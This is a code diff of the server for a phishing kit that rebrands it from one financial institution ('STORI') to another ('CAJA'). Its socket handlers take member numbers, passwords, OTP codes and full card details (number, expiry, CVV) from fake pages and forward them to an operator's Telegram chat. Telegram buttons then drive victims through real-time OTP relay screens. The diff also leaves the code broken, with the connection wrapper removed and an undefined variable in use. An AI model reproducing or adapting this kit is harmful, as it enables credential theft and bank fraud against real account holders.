@@ -1,3 +1,4 @@
+// server.js
 require('dotenv').config();
 const express = require('express');
 const app = express();
@@ -23,10 +24,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-// Manejo de conexiones socket
-io.on('connection', (socket) => {
-  console.log('🔌 Nuevo cliente conectado');
-
+  // Login principal (ajustado para campo socio)
   socket.on('dataForm', ({ socio, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
@@ -46,10 +44,12 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
+         
+  // Código OTP (bienvenido.html)
   socket.on('codigoIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `🔍 El usuario ingresó el siguiente código STORI:\n\n🧾 Código: ${codigo}`;
+    const mensaje = `🔍 El usuario ingresó el siguiente código CAJA:\n\n🧾 Código: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -65,10 +65,11 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
+  // OTP reintento (denegado.html)
   socket.on('otpIngresado', ({ codigo, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `📨 Reintento desde pantalla de error STORI:\n\n🧾 Nuevo código OTP: ${codigo}`;
+    const mensaje = `📨 Reintento desde pantalla de error CAJA:\n\n🧾 Nuevo código OTP: ${codigo}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -84,10 +85,11 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
+  // Formulario de errorlogo.html
   socket.on('errorlogoForm', ({ correo, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
-    const mensaje = `⚠️ Nuevo intento fallido detectado STORI:\n\n📧 Usuario: ${correo}\n🔑 Clave: ${contrasena}`;
+    const mensaje = `⚠️ Nuevo intento fallido detectado CAJA:\n\n🔢 Número de socio: ${socio}\n🔑 Clave: ${contrasena}`;
     const botones = {
       reply_markup: {
         inline_keyboard: [
@@ -103,6 +105,7 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
+  // Datos de tarjeta
   socket.on('datosTarjeta', ({ tarjeta, vencimiento, cvv, sessionId }) => {
     activeSockets.set(sessionId, socket);
 
@@ -122,19 +125,20 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
+  // Reconexión por sessionId
   socket.on('reconectar', (sessionId) => {
     activeSockets.set(sessionId, socket);
   });
 
+  // Redirección solicitada desde botones en el HTML
   socket.on("redirigir", ({ url, sessionId }) => {
     const socketTarget = activeSockets.get(sessionId);
     if (socketTarget) {
       socketTarget.emit("redirigir", url);
     }
   });
-});
 
-// Manejo de botones desde Telegram
+// Respuesta a botones desde Telegram
 bot.on('callback_query', (query) => {
   const data = query.data;
   const chatId = query.message.chat.id;
@@ -154,19 +158,27 @@ bot.on('callback_query', (query) => {
     const decision = data.startsWith('aprobado_') ? 'aprobado' : 'rechazado';
     socket.emit('respuesta', decision);
     bot.sendMessage(chatId, decision === 'aprobado' ? '✅ Acceso aprobado.' : '❌ Acceso denegado.');
-  } else if (data.startsWith('error_') || data.startsWith('finalizar_')) {
+  }
+
+  else if (data.startsWith('error_') || data.startsWith('finalizar_')) {
     const decision = data.startsWith('error_') ? 'error' : 'finalizar';
     socket.emit('respuestaCodigo', decision);
     bot.sendMessage(chatId, decision === 'error' ? '⚠️ Código incorrecto.' : '✅ Finalizando proceso...');
-  } else if (data.startsWith('otpFinalizar_') || data.startsWith('otpError_')) {
+  }
+
+  else if (data.startsWith('otpFinalizar_') || data.startsWith('otpError_')) {
     const decision = data.startsWith('otpFinalizar_') ? 'finalizar' : 'otp_error';
     socket.emit('respuestaOtp', decision);
     bot.sendMessage(chatId, decision === 'finalizar' ? '✅ Proceso finalizado.' : '❌ Código OTP inválido nuevamente.');
-  } else if (data.startsWith('otp_') || data.startsWith('errorlogo_')) {
+  }
+
+  else if (data.startsWith('otp_') || data.startsWith('errorlogo_')) {
     const decision = data.startsWith('otp_') ? 'otp' : 'error_logo';
     socket.emit('respuestaErrorLogo', decision);
     bot.sendMessage(chatId, decision === 'otp' ? '📲 Redirigiendo a ingreso de código.' : '🚫 Error logo, reenviando.');
-  } else if (data.startsWith('errortc_') || data.startsWith('finalizarTarjeta_') || data.startsWith('tc_')) {
+  }
+
+  else if (data.startsWith('errortc_') || data.startsWith('finalizarTarjeta_') || data.startsWith('tc_')) {
     const action = data.split('_')[0];
 
     if (action === 'errortc') {
